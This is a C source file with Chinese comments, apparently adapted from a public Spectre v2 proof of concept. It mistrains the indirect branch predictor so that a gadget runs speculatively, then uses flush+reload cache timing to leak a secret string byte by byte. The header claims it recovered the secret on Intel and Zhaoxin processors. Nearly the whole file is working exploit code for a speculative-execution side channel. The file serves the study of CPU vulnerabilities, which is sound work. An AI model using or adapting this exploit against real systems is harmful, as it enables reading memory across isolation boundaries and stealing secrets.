/***********************************************************************
 * 项目来自 https://github.com/Anton-Cao/spectrev2-poc
 * 
 * 借鉴 Bounds Check Bypass的main.c代码，对项目进行了代码补充。
 * 
 * 实验结果: 在Intel和兆芯处理器上均能够恢复密码数据
 * 
***********************************************************************/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include "../utils/cache_instr.h"

#define CACHE_HIT_THRESHOLD 120
#define GAP 4096

uint8_t channel[256 * GAP];
uint64_t *target; // 间接调用函数指针
char *secret = "The Magic Words are Squeamish Ossifrage.";

// 恶意片段代码
int volatile gadget(char *addr)
{
    // return channel[*addr * GAP];
    maccess(&channel[*addr * GAP]);
}

// 正常代码片段
uint64_t safe_target()
{
    return 42;
};

void victim(char *addr)
{
    int result;
    // call *target
    __asm__ volatile("callq *%1\n"
                     "mov %%eax, %0\n"
                     : "=r"(result)
                     : "r"(*target)
                     : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
}

void readCacheByte(int cache_hit_threshold, char *addr_to_read, char value[2], int score[2])
{
    int results[256];
    int tries, i, j, k, mix_i;
    uint64_t start, end;
    uint8_t *addr;
    char dummyChar = '$';

    // 初始化
    for (i = 0; i < 256; i++)
    {
        results[i] = 0;
        channel[i * GAP] = 1;
    }

    for (tries = 999; tries > 0; tries--)
    {

        // 训练阶段
        *target = (uint64_t)&gadget;
        mfence();
        for (j = 50; j > 0; j--)
        {
            victim(&dummyChar);
        }
        mfence();

        // 清除缓存
        for (i = 0; i < 256; i++)
            flush(&channel[i * GAP]);
        mfence();

        // 模拟安全的间接调用
        *target = (uint64_t)&safe_target;
        mfence();

        // 增加攻击窗口
        flush((void *)target);
        mfence();

        // call victim
        victim(addr_to_read);
        mfence();

        // 侧信道恢复
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            uint8_t *addr = &channel[mix_i * GAP];
            start = rdtscp();
            maccess(addr);
            end = rdtscp();
            if (end - start <= cache_hit_threshold)
                results[mix_i]++;
        }

        /* 找出得分最高的、第二高的字节 */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
    score[1] = results[k];
}

int main(int argc, char *argv[])
{
    target = (uint64_t *)malloc(sizeof(uint64_t)); // 若不初始化：*target野指针,对其解引用会导致段错误

    int cache_hit_threshold = 120;
    char *addr = secret;
    int len = 40;
    int score[2];
    uint8_t value[2];

    if (argc >= 2)
    {
        sscanf(argv[1], "%d", &cache_hit_threshold);
    }
    printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

    printf("Reading %d bytes:\n", len);
    while (--len >= 0)
    {
        printf("Reading at malicious_x = %p... ", (void *)addr);
        readCacheByte(cache_hit_threshold, addr++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' count=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
        {
            printf("\t(second best: 0x%02X='%c' count=%d)", value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
        }
        printf("\n");
    }
    free(target);
    return 0;
}